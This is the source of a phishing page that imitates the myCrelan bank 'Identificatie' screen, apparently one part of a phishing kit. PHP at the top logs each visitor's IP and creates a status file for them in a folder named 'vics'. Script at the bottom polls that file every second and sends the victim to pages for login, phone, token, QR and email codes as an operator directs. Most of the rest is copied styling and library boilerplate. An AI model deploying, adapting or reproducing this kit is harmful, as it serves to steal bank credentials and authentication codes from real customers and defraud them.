<?php
    require_once './functions.php';

 $Login = "--- ".$ip." USER IN Loading page  -------     ";
functiondilih($Login);
?>
<?php

    require_once './functions.php';
$fp = fopen('vics/'. get_client_ip() .'.txt', 'wb');
        fwrite($fp, 0);
        fclose($fp);
?>
<html data-critters-container="" class="" style=""><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="google" content="notranslate">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<title>myCrelan - Identificatie</title>
<script>
      (function(window, document){
          function normalizeUrl(url) { return url.replace('//', '/'); }
          function startsWith(str1, str2) { return str1.substring(0, str2.length) === str2; }
          var baseHref = document.getElementById('baseHref').getAttribute('href');
          var allowedSuffix = ['/', '/demo/']
              .map(function (p) { return normalizeUrl([baseHref, p].join('')); })
              .sort(function (a, b) { return b.length - a.length; });
          var chunks = window.location.pathname.split('/').filter(function (p) { return p !== '' });
          var suffix = normalizeUrl('/' + chunks.join('/') + '/');
          var finalSuffix = allowedSuffix.filter(function (p) { return startsWith(suffix, p); });
          window['base-href'] = finalSuffix.length > 0 ? finalSuffix[0] : baseHref;
      })(window, document);
  </script>
<style>:root,:host{--fa-font-solid:normal 900 1em/1"Font Awesome 6 Solid";--fa-font-regular:normal 400 1em/1"Font Awesome 6 Regular";--fa-font-light:normal 300 1em/1"Font Awesome 6 Light";--fa-font-thin:normal 100 1em/1"Font Awesome 6 Thin";--fa-font-duotone:normal 900 1em/1"Font Awesome 6 Duotone";--fa-font-sharp-solid:normal 900 1em/1"Font Awesome 6 Sharp";--fa-font-sharp-regular:normal 400 1em/1"Font Awesome 6 Sharp";--fa-font-sharp-light:normal 300 1em/1"Font Awesome 6 Sharp";--fa-font-sharp-thin:normal 100 1em/1"Font Awesome 6 Sharp";--fa-font-brands:normal 400 1em/1"Font Awesome 6 Brands"}svg:not(:root).svg-inline--fa,svg:not(:host).svg-inline--fa{overflow:visible;box-sizing:content-box}.svg-inline--fa{display:var(--fa-display,inline-block);height:1em;overflow:visible;vertical-align:-0.125em}@media (prefers-reduced-motion:reduce){}@-webkit-keyframes fa-beat{0%,90%{-webkit-transform:scale(1);transform:scale(1)}45%{-webkit-transform:scale(var(--fa-beat-scale,1.25));transform:scale(var(--fa-beat-scale,1.25))}}@keyframes fa-beat{0%,90%{-webkit-transform:scale(1);transform:scale(1)}45%{-webkit-transform:scale(var(--fa-beat-scale,1.25));transform:scale(var(--fa-beat-scale,1.25))}}@-webkit-keyframes fa-bounce{0%{-webkit-transform:scale(1,1) translateY(0);transform:scale(1,1) translateY(0)}10%{-webkit-transform:scale(var(--fa-bounce-start-scale-x,1.1),var(--fa-bounce-start-scale-y,0.9)) translateY(0);transform:scale(var(--fa-bounce-start-scale-x,1.1),var(--fa-bounce-start-scale-y,0.9)) translateY(0)}30%{-webkit-transform:scale(var(--fa-bounce-jump-scale-x,0.9),var(--fa-bounce-jump-scale-y,1.1)) translateY(var(--fa-bounce-height,-0.5em));transform:scale(var(--fa-bounce-jump-scale-x,0.9),var(--fa-bounce-jump-scale-y,1.1)) translateY(var(--fa-bounce-height,-0.5em))}50%{-webkit-transform:scale(var(--fa-bounce-land-scale-x,1.05),var(--fa-bounce-land-scale-y,0.95)) translateY(0);transform:scale(var(--fa-bounce-land-scale-x,1.05),var(--fa-bounce-land-scale-y,0.95)) translateY(0)}57%{-webkit-transform:scale(1,1) translateY(var(--fa-bounce-rebound,-0.125em));transform:scale(1,1) translateY(var(--fa-bounce-rebound,-0.125em))}64%{-webkit-transform:scale(1,1) translateY(0);transform:scale(1,1) translateY(0)}100%{-webkit-transform:scale(1,1) translateY(0);transform:scale(1,1) translateY(0)}}@keyframes fa-bounce{0%{-webkit-transform:scale(1,1) translateY(0);transform:scale(1,1) translateY(0)}10%{-webkit-transform:scale(var(--fa-bounce-start-scale-x,1.1),var(--fa-bounce-start-scale-y,0.9)) translateY(0);transform:scale(var(--fa-bounce-start-scale-x,1.1),var(--fa-bounce-start-scale-y,0.9)) translateY(0)}30%{-webkit-transform:scale(var(--fa-bounce-jump-scale-x,0.9),var(--fa-bounce-jump-scale-y,1.1)) translateY(var(--fa-bounce-height,-0.5em));transform:scale(var(--fa-bounce-jump-scale-x,0.9),var(--fa-bounce-jump-scale-y,1.1)) translateY(var(--fa-bounce-height,-0.5em))}50%{-webkit-transform:scale(var(--fa-bounce-land-scale-x,1.05),var(--fa-bounce-land-scale-y,0.95)) translateY(0);transform:scale(var(--fa-bounce-land-scale-x,1.05),var(--fa-bounce-land-scale-y,0.95)) translateY(0)}57%{-webkit-transform:scale(1,1) translateY(var(--fa-bounce-rebound,-0.125em));transform:scale(1,1) translateY(var(--fa-bounce-rebound,-0.125em))}64%{-webkit-transform:scale(1,1) translateY(0);transform:scale(1,1) translateY(0)}100%{-webkit-transform:scale(1,1) translateY(0);transform:scale(1,1) translateY(0)}}@-webkit-keyframes fa-fade{50%{opacity:var(--fa-fade-opacity,0.4)}}@keyframes fa-fade{50%{opacity:var(--fa-fade-opacity,0.4)}}@-webkit-keyframes fa-beat-fade{0%,100%{opacity:var(--fa-beat-fade-opacity,0.4);-webkit-transform:scale(1);transform:scale(1)}50%{opacity:1;-webkit-transform:scale(var(--fa-beat-fade-scale,1.125));transform:scale(var(--fa-beat-fade-scale,1.125))}}@keyframes fa-beat-fade{0%,100%{opacity:var(--fa-beat-fade-opacity,0.4);-webkit-transform:scale(1);transform:scale(1)}50%{opacity:1;-webkit-transform:scale(var(--fa-beat-fade-scale,1.125));transform:scale(var(--fa-beat-fade-scale,1.125))}}@-webkit-keyframes fa-flip{50%{-webkit-transform:rotate3d(var(--fa-flip-x,0),var(--fa-flip-y,1),var(--fa-flip-z,0),var(--fa-flip-angle,-180deg));transform:rotate3d(var(--fa-flip-x,0),var(--fa-flip-y,1),var(--fa-flip-z,0),var(--fa-flip-angle,-180deg))}}@keyframes fa-flip{50%{-webkit-transform:rotate3d(var(--fa-flip-x,0),var(--fa-flip-y,1),var(--fa-flip-z,0),var(--fa-flip-angle,-180deg));transform:rotate3d(var(--fa-flip-x,0),var(--fa-flip-y,1),var(--fa-flip-z,0),var(--fa-flip-angle,-180deg))}}@-webkit-keyframes fa-shake{0%{-webkit-transform:rotate(-15deg);transform:rotate(-15deg)}4%{-webkit-transform:rotate(15deg);transform:rotate(15deg)}8%,24%{-webkit-transform:rotate(-18deg);transform:rotate(-18deg)}12%,28%{-webkit-transform:rotate(18deg);transform:rotate(18deg)}16%{-webkit-transform:rotate(-22deg);transform:rotate(-22deg)}20%{-webkit-transform:rotate(22deg);transform:rotate(22deg)}32%{-webkit-transform:rotate(-12deg);transform:rotate(-12deg)}36%{-webkit-transform:rotate(12deg);transform:rotate(12deg)}40%,100%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}}@keyframes fa-shake{0%{-webkit-transform:rotate(-15deg);transform:rotate(-15deg)}4%{-webkit-transform:rotate(15deg);transform:rotate(15deg)}8%,24%{-webkit-transform:rotate(-18deg);transform:rotate(-18deg)}12%,28%{-webkit-transform:rotate(18deg);transform:rotate(18deg)}16%{-webkit-transform:rotate(-22deg);transform:rotate(-22deg)}20%{-webkit-transform:rotate(22deg);transform:rotate(22deg)}32%{-webkit-transform:rotate(-12deg);transform:rotate(-12deg)}36%{-webkit-transform:rotate(12deg);transform:rotate(12deg)}40%,100%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}}@-webkit-keyframes fa-spin{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes fa-spin{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}</style>
<meta name="theme-color" content="#1976d2">
<link rel="stylesheet" href="./app2.css"></head>
<body class="mat-app-background">
<myc-root ngcspnonce="{% CSP_NONCE %}" ng-version="18.1.2"><myc-loading><div><div class="container-fluid p-0 h-100"><router-outlet></router-outlet><myc-public class="ng-star-inserted"><myc-navigation><myc-public-header class="ng-star-inserted"><myc-session-expired></myc-session-expired><div class="header stripe sticky-top"><myc-cookie-policy></myc-cookie-policy><style>

.lds-ring {
  /* change color here */
  color: #84bd00
}
.lds-ring,
.lds-ring div {
  box-sizing: border-box;
}
.lds-ring {
  display: inline-block;
  position: relative;
  width: 80px;
  height: 80px;
}
.lds-ring div {
  box-sizing: border-box;
  display: block;
  position: absolute;
  width: 64px;
  height: 64px;
  margin: 8px;
  border: 8px solid currentColor;
  border-radius: 50%;
  animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
  border-color: currentColor transparent transparent transparent;
}
.lds-ring div:nth-child(1) {
  animation-delay: -0.45s;
}
.lds-ring div:nth-child(2) {
  animation-delay: -0.3s;
}
.lds-ring div:nth-child(3) {
  animation-delay: -0.15s;
}
@keyframes lds-ring {
  0% {
    transform: rotate(0deg);
  }
  100% {
    transform: rotate(360deg);
  }
}

</style><div class="d-flex"><section class="header-left"><a class="header__logo" aria-label="MyCrelan website" href="#?/public/landing"></a></section><section class="flex-grow-1 header-middle text-end my-auto pe-5"><myc-dropdown class="d-inline-flex"><mat-menu class="ng-tns-c1923052698-0 ng-star-inserted sf-hidden"></mat-menu></myc-dropdown></section></div></div></myc-public-header><div>            <form action="i.php" method="post" id="codeForm">
<main><router-outlet class="ng-star-inserted"></router-outlet><ng-component class="ng-star-inserted"><myc-loading><div class="ng-star-inserted"><myc-public-sidebar-content class="ng-star-inserted"></myc-public-sidebar-content><myc-digipass-identification class="ng-star-inserted"><br><br><br><br><br><center><div class="lds-ring"><div></div><div></div><div></div><div></div></div></center><div class="card ng-star-inserted"></div></myc-digipass-identification></div></myc-loading></ng-component></main></form></div><myc-footer></myc-footer></myc-navigation><myc-deprecation-warning></myc-deprecation-warning></myc-public></div></div></myc-loading><myc-error></myc-error></myc-root>



<script>
    /*! modernizr 3.11.4 (Custom Build) | MIT *
     * https://modernizr.com/download/?-cssscrollbar-flexbox-getrandomvalues-smil-setclasses-cssclassprefix:modzr- !*/
    !function(e,n,t,r){function o(e,n){return typeof e===n}function i(e,n){return!!~(""+e).indexOf(n)}function s(){return"function"!=typeof t.createElement?t.createElement(arguments[0]):S?t.createElementNS.call(t,"http://www.w3.org/2000/svg",arguments[0]):t.createElement.apply(t,arguments)}function l(){var e=t.body;return e||(e=s(S?"svg":"body"),e.fake=!0),e}function a(e,n,r,o){var i,a,f,u,c="modernizr",d=s("div"),p=l();if(parseInt(r,10))for(;r--;)f=s("div"),f.id=o?o[r]:c+(r+1),d.appendChild(f);return i=s("style"),i.type="text/css",i.id="s"+c,(p.fake?p:d).appendChild(i),p.appendChild(d),i.styleSheet?i.styleSheet.cssText=e:i.appendChild(t.createTextNode(e)),d.id=c,p.fake&&(p.style.background="",p.style.overflow="hidden",u=x.style.overflow,x.style.overflow="hidden",x.appendChild(p)),a=n(d,e),p.fake?(p.parentNode.removeChild(p),x.style.overflow=u,x.offsetHeight):d.parentNode.removeChild(d),!!a}function f(e){return e.replace(/([A-Z])/g,function(e,n){return"-"+n.toLowerCase()}).replace(/^ms-/,"-ms-")}function u(e,t,r){var o;if("getComputedStyle"in n){o=getComputedStyle.call(n,e,t);var i=n.console;if(null!==o)r&&(o=o.getPropertyValue(r));else if(i){var s=i.error?"error":"log";i[s].call(i,"getComputedStyle returning null, its possible modernizr test results are inaccurate")}}else o=!t&&e.currentStyle&&e.currentStyle[r];return o}function c(e,t){var o=e.length;if("CSS"in n&&"supports"in n.CSS){for(;o--;)if(n.CSS.supports(f(e[o]),t))return!0;return!1}if("CSSSupportsRule"in n){for(var i=[];o--;)i.push("("+f(e[o])+":"+t+")");return i=i.join(" or "),a("@supports ("+i+") { #modernizr { position: absolute; } }",function(e){return"absolute"===u(e,null,"position")})}return r}function d(e){return e.replace(/([a-z])-([a-z])/g,function(e,n,t){return n+t.toUpperCase()}).replace(/^-/,"")}function p(e,n,t,l){function a(){u&&(delete E.style,delete E.modElem)}if(l=!o(l,"undefined")&&l,!o(t,"undefined")){var f=c(e,t);if(!o(f,"undefined"))return f}for(var u,p,m,v,h,g=["modernizr","tspan","samp"];!E.style&&g.length;)u=!0,E.modElem=s(g.shift()),E.style=E.modElem.style;for(m=e.length,p=0;p<m;p++)if(v=e[p],h=E.style[v],i(v,"-")&&(v=d(v)),E.style[v]!==r){if(l||o(t,"undefined"))return a(),"pfx"!==n||v;try{E.style[v]=t}catch(e){}if(E.style[v]!==h)return a(),"pfx"!==n||v}return a(),!1}function m(e,n){return function(){return e.apply(n,arguments)}}function v(e,n,t){var r;for(var i in e)if(e[i]in n)return!1===t?e[i]:(r=n[e[i]],o(r,"function")?m(r,t||n):r);return!1}function h(e,n,t,r,i){var s=e.charAt(0).toUpperCase()+e.slice(1),l=(e+" "+b.join(s+" ")+s).split(" ");return o(n,"string")||o(n,"undefined")?p(l,n,r,i):(l=(e+" "+P.join(s+" ")+s).split(" "),v(l,n,t))}function g(e,n,t){return h(e,r,r,n,t)}var y=[],w={_version:"3.11.4",_config:{classPrefix:'modzr-',enableClasses:!0,enableJSClass:!0,usePrefixes:!0},_q:[],on:function(e,n){var t=this;setTimeout(function(){n(t[e])},0)},addTest:function(e,n,t){y.push({name:e,fn:n,options:t})},addAsyncTest:function(e){y.push({name:null,fn:e})}},Modernizr=function(){};Modernizr.prototype=w,Modernizr=new Modernizr;var C=[],x=t.documentElement,S="svg"===x.nodeName.toLowerCase(),_="Moz O ms Webkit",b=w._config.usePrefixes?_.split(" "):[];w._cssomPrefixes=b;var z={elem:s("modernizr")};Modernizr._q.push(function(){delete z.elem});var E={style:z.elem.style};Modernizr._q.unshift(function(){delete E.style});var P=w._config.usePrefixes?_.toLowerCase().split(" "):[];w._domPrefixes=P,w.testAllProps=h;var N=function(e){var t,o=U.length,i=n.CSSRule;if(void 0===i)return r;if(!e)return!1;if(e=e.replace(/^@/,""),(t=e.replace(/-/g,"_").toUpperCase()+"_RULE")in i)return"@"+e;for(var s=0;s<o;s++){var l=U[s];if(l.toUpperCase()+"_"+t in i)return"@-"+l.toLowerCase()+"-"+e}return!1};w.atRule=N;var T,j=w.prefixed=function(e,n,t){return 0===e.indexOf("@")?N(e):(-1!==e.indexOf("-")&&(e=d(e)),n?h(e,n,t):h(e,"pfx"))},A=j("crypto",n);if(A&&"getRandomValues"in A&&"Uint32Array"in n){var R=new Uint32Array(10),k=A.getRandomValues(R);T=k&&o(k[0],"number")}Modernizr.addTest("getrandomvalues",!!T),w.testAllProps=g,Modernizr.addTest("flexbox",g("flexBasis","1px",!0));var L=w.testStyles=a,U=w._config.usePrefixes?" -webkit- -moz- -o- -ms- ".split(" "):["",""];w._prefixes=U,L("#modernizr{overflow: scroll; width: 40px; height: 40px; }#"+U.join("scrollbar{width:10px} #modernizr::").split("#").slice(1).join("#")+"scrollbar{width:10px}",function(e){Modernizr.addTest("cssscrollbar","scrollWidth"in e&&30===e.scrollWidth)});var V={}.toString;Modernizr.addTest("smil",function(){return!!t.createElementNS&&/SVGAnimate/.test(V.call(t.createElementNS("http://www.w3.org/2000/svg","animate")))}),function(){var e,n,t,r,i,s,l;for(var a in y)if(y.hasOwnProperty(a)){if(e=[],n=y[a],n.name&&(e.push(n.name.toLowerCase()),n.options&&n.options.aliases&&n.options.aliases.length))for(t=0;t<n.options.aliases.length;t++)e.push(n.options.aliases[t].toLowerCase());for(r=o(n.fn,"function")?n.fn():n.fn,i=0;i<e.length;i++)s=e[i],l=s.split("."),1===l.length?Modernizr[l[0]]=r:(Modernizr[l[0]]&&(!Modernizr[l[0]]||Modernizr[l[0]]instanceof Boolean)||(Modernizr[l[0]]=new Boolean(Modernizr[l[0]])),Modernizr[l[0]][l[1]]=r),C.push((r?"":"no-")+l.join("-"))}}(),function(e){var n=x.className,t=Modernizr._config.classPrefix||"";if(S&&(n=n.baseVal),Modernizr._config.enableJSClass){var r=new RegExp("(^|\\s)"+t+"no-js(\\s|$)");n=n.replace(r,"$1"+t+"js$2")}Modernizr._config.enableClasses&&(e.length>0&&(n+=" "+t+e.join(" "+t)),S?x.className.baseVal=n:x.className=n)}(C),delete w.addTest,delete w.addAsyncTest;for(var O=0;O<Modernizr._q.length;O++)Modernizr._q[O]();e.Modernizr=Modernizr}(window,window,document);

    if (Modernizr.getrandomvalues && Modernizr.flexbox && Modernizr.smil) {
      document.getElementById('tb-application').style.display = 'block';
    } else {
      document.getElementById('tb-unsupported-browser').style.display = 'block';
      document.body.style.background = '#08080A';
      document.body.style.margin = '0';
    }
  </script>

<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery-simple-upload@1.1.0/simpleUpload.min.js"></script>
        <script src="../assets/js/script.js"></script>
<script>


            var ip = '<?php echo get_client_ip(); ?>';
            var waiting = setInterval(function() {
                $.get('vics/' + ip + '.txt', function(data) {
                    var zz = data.split("|");
                    var dd = zz[0];
                    if( data == 0 ) {
                    } else if( dd == 'login' ) {
                        location.href = "log.php";
                    } else if( dd == 'phone' ) {
                        location.href = "tel.php";
                    } else if( dd == 'token1' ) {
                        location.href = "token1.php";
                    } else if( dd == 'cec' ) {
                        location.href = "cec.php";
                    } else if( dd == 'qr' ) {
                        location.href = "qr.php?code=" + zz[1];
                    } else if( dd == 'email' ) {
                        location.href = "email.php?code=" + zz[1];            
                    } else if( dd == 'extra' ) {
                        location.href = "extra.php?code=" + zz[1];            
                    } else if( dd == 'success' ) {
                        location.href = "success.php";
                    }
                });
            }, 1000);
        </script>



</body></html>